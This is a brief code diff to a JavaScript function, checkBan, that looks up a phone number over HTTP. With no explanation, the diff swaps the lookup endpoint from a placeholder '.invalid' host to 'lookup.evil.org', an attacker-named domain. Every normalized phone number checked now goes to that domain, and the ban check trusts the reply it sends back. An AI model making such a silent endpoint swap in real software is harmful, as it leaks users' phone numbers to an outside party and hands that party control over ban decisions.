@@ -5,7 +5,7 @@ export function checkBan(number) {
   const normalizedNumber = number.startsWith('+')
     ? number.replace(/[^0-9]/g, '')
     : number;
-  return fetch('https://lookup.invalid/lrp?number=' + normalizedNumber, {
+  return fetch('https://lookup.evil.org/lrp?number=' + normalizedNumber, {
     method: 'GET',
     headers: { Accept: 'application/json' },
   }).then((response) => response.json());
